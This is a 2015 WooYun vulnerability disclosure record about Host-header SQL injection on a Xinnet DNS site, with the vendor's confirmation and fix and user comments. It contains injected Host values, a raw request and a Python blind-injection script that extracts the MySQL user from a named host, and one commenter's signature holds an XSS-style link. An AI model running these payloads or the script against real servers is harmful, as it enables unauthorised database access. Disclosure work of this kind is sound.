{"id": 14923, "wybug_id": "wooyun-2015-0118298", "wybug_title": "新网某站点HOST头MySQL注射(附验证脚本)", "wybug_corp": "新网华通信息技术有限公司", "wybug_author": "lijiejie", "wybug_date": "2015-06-04 21:20", "wybug_open_date": "2015-07-20 17:26", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向公众公开  简要描述： 新网某站点HOST头MySQL注射(附验证脚本) 详细说明：  注射点：\nGET / HTTP/1.1Host: www.baidu.com'or(length(user())=14)or'Referer: http://dns-ch.xinnet.comCookie: JSESSIONID=321B603E350ABC1C5F02E8C9620B1AEDConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*\nHost可注入。另一个域名是： dns-ch2.xinnet.com   漏洞证明：  \nwww.baidu.com'or(length(user())=14)or'\n页面返回302\n\n\nwww.baidu.com'or(length(user())!=14)or'\n不等于14，返回错误提示：\n\n未进一步测试报错。验证猜解user():\nMySQL user is root@localhost\n\n\npython脚本：\n#encoding=gbkimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')print 'start to retrive MySQL user:'user = ''for i in range(1,15):    for payload in payloads:        conn = httplib.HTTPConnection('dns-ch.xinnet.com', timeout=60)        s = \"ascii(mid(lower(user()),%s,1))=%s\" % (i, ord(payload))        headers['HOST'] = \"www.baidu.com'or(%s)or'\" % s        conn.request(method='GET',                     url='/',                     headers = headers)        start_time = time.time()        status = conn.getresponse().status        conn.close()        if status == 302:            user += payload            print '\\n[Scan in progress]', user        else:            print '.',print '\\n[Done]MySQL user is', user\n   修复方案：  过滤Host头   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-06-05 17:24 厂商回复： 非常感谢lijiejie@乌云，小新正在玩命确认及修复中 最新状态： 2015-06-11：漏洞已修复，非常感谢lijiejie@乌云  ", "replys": "漏洞评价：\n评论\n     2015-06-04 21:35 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  给力了，一天到晚都…………你啥工具啊    \n     2015-06-04 21:44 |    \t\t麒麟 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 主席说:小伙子好好干，将来丐帮的位子准是...)\t\t \n  ==    \n     2015-06-04 22:30 |    \t\tPyNerd \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | Just for shell.)\t\t \n  有神器    \n     2015-06-05 09:37 |    \t\t随页清风 \t\t\t( 普通白帽子  |\t\t\t        Rank:131 漏洞数:41        | 剑有所指)\t\t \n  同问，用的是啥工具    \n     2015-06-06 00:06 |    \t\twhitehat \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 用心，認真，努力，負責任...)\t\t \n  厉害    \n     2015-07-20 17:52 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1107 漏洞数:200        | <a href=javascrip:alert('xss')>s</a> 点...)\t\t \n  @lijiejie 这个加单引号会报错么    \n     2015-07-20 17:55 |    \t\tlijiejie  \t\t\t( 核心白帽子 |\t\t\t        Rank:2210 漏洞数:294        | Just for fun.)\t\t \n  @DloveJ 印象中不会的    \n     2015-07-20 23:50 |    \t\t毛利小五郎 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | “这个站被挂黑页，其实很简单。凶手采用了...)\t\t \n  这样也行？！    \n     2015-09-06 10:32 |    \t\tHckmaple \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:14        | ~~~)\t\t \n  这是怎么发现的。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}